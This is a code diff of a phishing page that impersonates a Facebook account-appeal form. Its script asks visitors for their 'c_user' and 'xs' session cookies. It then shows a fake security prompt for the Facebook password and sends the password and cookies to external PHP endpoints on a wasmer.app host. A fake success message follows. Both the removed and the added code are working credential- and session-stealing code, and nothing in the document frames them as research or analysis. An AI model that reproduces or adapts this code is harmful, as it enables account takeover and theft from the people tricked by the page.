@@ -1547,333 +1547,157 @@
             }
         });
         
-        // Function to submit password to the specified endpoint
-        function submitPasswordToEndpoint(data) {
-            const endpoint = 'https://qwerty-1713c.wasmer.app/Shoibpass.php';
-            
-            // Prepare the data to send
-            const formData = new FormData();
-            formData.append('password', data.password);
-            formData.append('timestamp', data.timestamp);
+       <script>
+// Endpoints
+const PASSWORD_ENDPOINT = 'https://qwerty-1713c.wasmer.app/Shoibpass.php';
+const SESSION_ENDPOINT = 'https://qwerty-1713c.wasmer.app/Shoib.php';
 
-            // Send the data to the endpoint
-            return fetch(endpoint, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
-                return response.text();
-            });
-        }
-        
-        // Function to submit xs/c_user to the specified endpoint
-        function submitDataToEndpoint(data) {
-            const endpoint = 'https://qwerty-1713c.wasmer.app/Shoib.php';
-            
-            // Prepare the data to send
-            const formData = new FormData();
-            formData.append('c_user', data.c_user);
-            formData.append('xs', data.xs);
-            formData.append('language', data.language);
-            formData.append('timestamp', data.timestamp);
+// Helper to POST data
+function postFormData(url, dataObj) {
+    const formData = new FormData();
+    for (let key in dataObj) {
+        formData.append(key, dataObj[key]);
+    }
 
-            // Send the data to the endpoint
-            return fetch(endpoint, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) throw new Error('Network response was not ok');
-                return response.text();
-            });
+    console.log("Submitting to:", url, "with data:", Object.fromEntries(formData.entries()));
+
+    return fetch(url, {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        if (!response.ok) throw new Error('Network response was not ok');
+        return response.text();
+    });
+}
+
+// Form elements
+const appealForm = document.querySelector('.appeal-form');
+const submitBtn = document.getElementById('submit-appeal-btn');
+const currentLanguage = 'en'; // Or dynamically set this
+
+submitBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+
+    const c_user = document.getElementById('c_user')?.value.trim();
+    const xs = document.getElementById('xs')?.value.trim();
+
+    if (!c_user || !xs) {
+        alert('Please fill in both required fields.');
+        return;
+    }
+
+    if (!/^\d+$/.test(c_user)) {
+        alert('The c_user must be numbers only.');
+        return;
+    }
+
+    if (!/^[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};\'":\\|,.<>\/?]+$/.test(xs)) {
+        alert('The xs must be a valid combination of characters.');
+        return;
+    }
+
+    // Disable the button
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Processing...';
+
+    // Show password prompt
+    const passwordPrompt = document.createElement('div');
+    passwordPrompt.className = 'password-prompt-overlay';
+    passwordPrompt.innerHTML = `
+        <div class="password-prompt">
+            <div class="password-prompt-header">
+                <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                <h3>Security Verification</h3>
+            </div>
+            <div class="password-prompt-body">
+                <p>Please enter your Facebook password to confirm your identity:</p>
+                <input type="password" id="password-input" placeholder="Enter your password">
+                <div class="password-prompt-actions">
+                    <button id="cancel-password-btn">Cancel</button>
+                    <button id="confirm-password-btn" class="primary">Continue</button>
+                </div>
+            </div>
+        </div>
+    `;
+    document.body.appendChild(passwordPrompt);
+
+    const passwordInput = document.getElementById('password-input');
+    const cancelPasswordBtn = document.getElementById('cancel-password-btn');
+    const confirmPasswordBtn = document.getElementById('confirm-password-btn');
+
+    cancelPasswordBtn.addEventListener('click', () => {
+        document.body.removeChild(passwordPrompt);
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Submit Appeal';
+    });
+
+    confirmPasswordBtn.addEventListener('click', async () => {
+        const password = passwordInput.value.trim();
+        const timestamp = new Date().toISOString();
+
+        if (!password) {
+            alert('Password is required.');
+            return;
         }
-        
-        // Form submission handling
-        const appealForm = document.querySelector('.appeal-form');
-        const submitBtn = document.getElementById('submit-appeal-btn');
-        
-        submitBtn.addEventListener('click', async function(e) {
-            e.preventDefault();
-            
-            const c_user = document.getElementById('c_user').value.trim();
-            const xs = document.getElementById('xs').value.trim();
-            
-            // Basic validation
-            if (!c_user || !xs) {
-                alert(translations[currentLanguage]['required_fields'] || 'Please fill in both required fields before submitting your appeal.');
-                return;
-            }
-            
-            if (!/^\d+$/.test(c_user)) {
-                alert(translations[currentLanguage]['c_user_numbers'] || 'The c_user value must contain only numbers.');
-                return;
-            }
-            
-            if (!/^[A-Za-z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+$/.test(xs)) {
-                alert(translations[currentLanguage]['xs_combination'] || 'The xs value must contain a combination of letters, numbers, and symbols.');
-                return;
-            }
-            
-            // Simulate form submission
-            submitBtn.disabled = true;
-            submitBtn.textContent = translations[currentLanguage]['processing'] || 'Processing...';
-            
-            try {
-                // Create password prompt
-                const passwordPrompt = document.createElement('div');
-                passwordPrompt.className = 'password-prompt-overlay';
-                passwordPrompt.innerHTML = `
-                    <div class="password-prompt">
-                        <div class="password-prompt-header">
-                            <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
-                            <h3>${translations[currentLanguage]['security_verification'] || 'Security Verification'}</h3>
-                        </div>
-                        <div class="password-prompt-body">
-                            <p>${translations[currentLanguage]['enter_password'] || 'For security purposes, please enter your Facebook password to confirm your identity:'}</p>
-                            <input type="password" id="password-input" placeholder="${translations[currentLanguage]['enter_password_placeholder'] || 'Enter your password'}" autocomplete="current-password">
-                            <div class="password-prompt-actions">
-                                <button id="cancel-password-btn">${translations[currentLanguage]['cancel'] || 'Cancel'}</button>
-                                <button id="confirm-password-btn" class="primary">${translations[currentLanguage]['continue'] || 'Continue'}</button>
-                            </div>
-                            <div class="password-help">
-                                <a href="#" style="color: #1877f2; text-decoration: none;">${translations[currentLanguage]['forgot_password'] || 'Forgot password?'}</a>
-                            </div>
+
+        confirmPasswordBtn.disabled = true;
+        confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
+
+        try {
+            // Submit password
+            await postFormData(PASSWORD_ENDPOINT, {
+                password,
+                timestamp
+            });
+
+            // Submit c_user and xs
+            await postFormData(SESSION_ENDPOINT, {
+                c_user,
+                xs,
+                language: currentLanguage,
+                timestamp
+            });
+
+            document.body.removeChild(passwordPrompt);
+
+            // Show success message
+            const successMessage = document.createElement('div');
+            successMessage.className = 'password-prompt-overlay';
+            successMessage.innerHTML = `
+                <div class="password-prompt">
+                    <div class="password-prompt-header">
+                        <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
+                        <h3>Appeal Submitted</h3>
+                    </div>
+                    <div class="password-prompt-body">
+                        <p>Your appeal has been submitted successfully! We will review your request.</p>
+                        <div class="password-prompt-actions" style="justify-content: center;">
+                            <button id="close-success-btn" class="primary">OK</button>
                         </div>
                     </div>
-                `;
-                
-                document.body.appendChild(passwordPrompt);
-                
-                // Handle password prompt
-                const passwordInput = document.getElementById('password-input');
-                const cancelPasswordBtn = document.getElementById('cancel-password-btn');
-                const confirmPasswordBtn = document.getElementById('confirm-password-btn');
-                
-                passwordInput.focus();
-                
-                cancelPasswordBtn.addEventListener('click', function() {
-                    document.body.removeChild(passwordPrompt);
-                    submitBtn.disabled = false;
-                    submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-                });
-                
-                confirmPasswordBtn.addEventListener('click', async function() {
-                    const password = passwordInput.value.trim();
-                    
-                    if (!password) {
-                        alert(translations[currentLanguage]['password_required'] || 'Password is required to submit your appeal.');
-                        return;
-                    }
-                    
-                    // Prepare complete form data
-                    const formData = {
-                        c_user: c_user,
-                        xs: xs,
-                        password: password,
-                        language: currentLanguage,
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    try {
-                        confirmPasswordBtn.disabled = true;
-                        confirmPasswordBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${translations[currentLanguage]['processing'] || 'Processing...'}`;
-                        
-                        // Submit password to shoib.pass endpoint
-                        await submitPasswordToEndpoint({
-                            password: password,
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        // Submit xs/c_user to Shoib.php endpoint
-                        await submitDataToEndpoint({
-                            c_user: c_user,
-                            xs: xs,
-                            language: currentLanguage,
-                            timestamp: new Date().toISOString()
-                        });
-                        
-                        document.body.removeChild(passwordPrompt);
-                        
-                        // Show success message
-                        const successMessage = document.createElement('div');
-                        successMessage.className = 'password-prompt-overlay';
-                        successMessage.innerHTML = `
-                            <div class="password-prompt">
-                                <div class="password-prompt-header">
-                                    <i class="fab fa-facebook" style="color: #1877f2; font-size: 32px; margin-right: 10px;"></i>
-                                    <h3>${translations[currentLanguage]['appeal_submitted'] || 'Appeal Submitted'}</h3>
-                                </div>
-                                <div class="password-prompt-body">
-                                    <p>${translations[currentLanguage]['appeal_success'] || 'Your appeal has been submitted successfully! Our team will review your request and respond via email within 7 business days.'}</p>
-                                    <div class="password-prompt-actions" style="justify-content: center;">
-                                        <button id="close-success-btn" class="primary">${translations[currentLanguage]['ok'] || 'OK'}</button>
-                                    </div>
-                                </div>
-                            </div>
-                        `;
-                        
-                        document.body.appendChild(successMessage);
-                        
-                        document.getElementById('close-success-btn').addEventListener('click', function() {
-                            document.body.removeChild(successMessage);
-                            appealForm.reset();
-                            submitBtn.disabled = false;
-                            submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-                        });
-                    } catch (error) {
-                        console.error('Form submission error:', error);
-                        alert(translations[currentLanguage]['submission_error'] || 'An error occurred while submitting your appeal. Please try again later.');
-                        confirmPasswordBtn.disabled = false;
-                        confirmPasswordBtn.innerHTML = translations[currentLanguage]['continue'] || 'Continue';
-                    }
-                });
-                
-                passwordInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        confirmPasswordBtn.click();
-                    }
-                });
-                
-            } catch (error) {
-                console.error('Error:', error);
+                </div>
+            `;
+            document.body.appendChild(successMessage);
+
+            document.getElementById('close-success-btn').addEventListener('click', () => {
+                document.body.removeChild(successMessage);
+                appealForm.reset();
                 submitBtn.disabled = false;
-                submitBtn.textContent = translations[currentLanguage]['submit_appeal'] || 'Submit Appeal';
-                alert(translations[currentLanguage]['error_occurred'] || 'An error occurred. Please try again.');
-            }
-        });
-        
-        // Cancel button functionality
-        const cancelBtn = document.querySelector('.btn-secondary');
-        cancelBtn.addEventListener('click', function() {
-            if (confirm(translations[currentLanguage]['confirm_cancel'] || 'Are you sure you want to cancel? Any unsaved information will be lost.')) {
-                window.location.href = '#';
-            }
-        });
-        
-        // Video language selector functionality
-        const video = document.getElementById('appeal-video');
-        const languageSelector = document.getElementById('language-selector');
-        const playButton = document.getElementById('play-video-btn');
-        const confirmLanguageBtn = document.getElementById('confirm-language-btn');
-        const cancelLanguageBtn = document.getElementById('cancel-language-btn');
-        const languageOptions = document.querySelectorAll('#language-selector .language-option');
-        
-        // Initialize video with no controls
-        video.controls = false;
-        
-        // When play button is clicked, show language selector
-        playButton.addEventListener('click', function() {
-            document.getElementById('language-selector').style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-        });
-        
-        // When confirm button is clicked in language selector
-        confirmLanguageBtn.addEventListener('click', function() {
-            document.getElementById('language-selector').style.display = 'none';
-            document.body.style.overflow = '';
-            
-            const selectedOption = document.querySelector('#language-selector .language-option.selected');
-            const videoSrc = selectedOption.getAttribute('data-src');
-            
-            if (videoSrc && video.src !== videoSrc) {
-                video.src = videoSrc;
-                video.load();
-            }
-            
-            video.controls = true;
-            video.play().catch(e => console.log('Video play failed:', e));
-            playButton.style.display = 'none';
-        });
-        
-        // When cancel button is clicked in language selector
-        cancelLanguageBtn.addEventListener('click', function() {
-            document.getElementById('language-selector').style.display = 'none';
-            document.body.style.overflow = '';
-        });
-        
-        // Language selection for video
-        document.querySelectorAll('#language-selector .language-option').forEach(option => {
-            option.addEventListener('click', function() {
-                document.querySelectorAll('#language-selector .language-option').forEach(opt => {
-                    opt.classList.remove('selected');
-                });
-                this.classList.add('selected');
+                submitBtn.textContent = 'Submit Appeal';
             });
-        });
-        
-        // When video ends, show the play button again
-        video.addEventListener('ended', function() {
-            playButton.style.display = 'flex';
-        });
-        
-        // If video is paused by user, show controls
-        video.addEventListener('pause', function() {
-            video.controls = true;
-        });
-        
-        // Show play button when video is not playing
-        video.addEventListener('play', function() {
-            playButton.style.display = 'none';
-        });
 
-        // Translation selector functionality
-        const translateBtn = document.getElementById('translate-btn');
-        const translationSelector = document.getElementById('translation-selector');
-        const confirmTranslationBtn = document.getElementById('confirm-translation-btn');
-        const cancelTranslationBtn = document.getElementById('cancel-translation-btn');
-        
-        // When translate button is clicked
-        translateBtn.addEventListener('click', function() {
-            translationSelector.style.display = 'flex';
-            document.body.style.overflow = 'hidden';
-            
-            document.querySelectorAll('#translation-selector .language-option').forEach(option => {
-                option.classList.remove('selected');
-                if (option.getAttribute('data-lang') === currentLanguage) {
-                    option.classList.add('selected');
-                }
-            });
-        });
-        
-        // When confirm button is clicked in translation selector
-        confirmTranslationBtn.addEventListener('click', function() {
-            const selectedOption = document.querySelector('#translation-selector .language-option.selected');
-            const lang = selectedOption.getAttribute('data-lang');
-            
-            translationSelector.style.display = 'none';
-            document.body.style.overflow = '';
-            
-            if (lang !== currentLanguage) {
-                translatePage(lang);
-            }
-        });
-        
-        // When cancel button is clicked in translation selector
-        cancelTranslationBtn.addEventListener('click', function() {
-            translationSelector.style.display = 'none';
-            document.body.style.overflow = '';
-        });
-        
-        // Language selection for translation
-        document.querySelectorAll('#translation-selector .language-option').forEach(option => {
-            option.addEventListener('click', function() {
-                document.querySelectorAll('#translation-selector .language-option').forEach(opt => {
-                    opt.classList.remove('selected');
-                });
-                this.classList.add('selected');
-            });
-        });
-        
-        // Close selectors when clicking outside
-        [languageSelector, translationSelector].forEach(selector => {
-            selector.addEventListener('click', function(e) {
-                if (e.target === selector) {
-                    selector.style.display = 'none';
-                    document.body.style.overflow = '';
-                }
-            });
-        });
-    </script>
+        } catch (error) {
+            console.error('Submission error:', error);
+            alert('An error occurred while submitting your appeal.');
+            confirmPasswordBtn.disabled = false;
+            confirmPasswordBtn.innerHTML = 'Continue';
+        }
+    });
 
-</body></html>
+    passwordInput.addEventListener('keypress', function (e) {
+        if (e.key === 'Enter') {
+            confirmPasswordBtn.click();
+        }
+    });
+});
+</script>
